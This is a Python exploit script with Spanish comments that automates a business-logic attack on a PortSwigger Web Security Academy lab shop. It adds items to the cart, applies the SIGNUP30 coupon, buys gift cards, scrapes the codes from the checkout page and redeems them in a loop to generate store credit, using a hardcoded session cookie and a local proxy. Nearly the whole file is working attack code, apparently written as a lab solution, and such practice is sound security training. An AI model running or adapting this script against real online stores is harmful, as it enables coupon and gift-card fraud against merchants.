import requests, signal, sys, string, time, base64, pdb, re
from bs4 import BeautifulSoup
from pwn import *
import urllib3

urllib3.disable_warnings()

#Variables Globales, 
# 1.tenemos que poner en el carrito, 
# 2.aplicar el descuento, 
# 3.comprar siguiendo los redirects,  
# 4.copiar los codigos en un documento, 
# 5. leer linea por linea mientras los canjeo
URL_cart = "https://0a90001f039b438b823606840082006f.web-security-academy.net/cart"
URL_redeem = "https://0a90001f039b438b823606840082006f.web-security-academy.net/cart/coupon"
URL_code_apply = "https://0a90001f039b438b823606840082006f.web-security-academy.net/gift-card"
URL_BUY = "https://0a90001f039b438b823606840082006f.web-security-academy.net/cart/checkout"
cookie = {"session":"74qWR9DRhKD0EftQylsHM0d7MMJ8yh6a"}
proxy = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}
csrf = ""
def def_handler(sig, frame):
    print("\n[+] Saliendo...")
    exit(1)
signal.signal(signal.SIGINT, def_handler)


def add_cart():
    data_post = {"productId":"2","redir":"PRODUCT","quantity":"50"}
    # Lo metemos en el carro
    r_cart = requests.post(url=URL_cart, data=data_post, cookies=cookie, verify=False)

def parse_token():   
    # Primero tenemos que coger el csrf
    r = requests.get(url=URL_cart, allow_redirects=True, cookies=cookie, verify=False)
    csrf = re.search('name="csrf" value="([0-9a-zA-z]+)', r.text).group(1)
    return csrf

def apply():
    #csrf = parse_token()
    data_post_apply = {"csrf": f"{csrf}", "coupon": "SIGNUP30"} 
    r = requests.post(url = URL_redeem, cookies=cookie, data=data_post_apply, verify=False)

def buy():
    #csrf = parse_token()
    data_post_buy = {"csrf":f"{csrf}"}
    # Compramos
    r_buy = requests.post(url=URL_BUY, data=data_post_buy, cookies=cookie, verify=False)
    print(r_buy.text)
    lista_temporal = re.findall("<td>(.*?)</td>", r_buy.text)
    lista_de_tags = []
    for i in lista_temporal:
        if re.match("([0-9a-zA-z]+)", i) and i != "SIGNUP30":
            lista_de_tags.append(i)
    print(lista_de_tags)
    return lista_de_tags
    
def redeem(lista_codigo):
    #csrf = parse_token()
    for codigo in lista_codigo:
        data_post_redeem = {"csrf":f"{csrf}","gift-card":f"{codigo}"}
        # Hacemos un redeem de los codigos
        r_redeem = requests.post(url = URL_code_apply, verify=False, data=data_post_redeem, allow_redirects=True, cookies=cookie)

if __name__ == "__main__":
    #  Añadimos al carrito
    add_cart()
    csrf=parse_token()
    # Aplicamos descuento
    apply()
    # Compramos
    lista = buy()
    # redeem
    redeem(lista)

    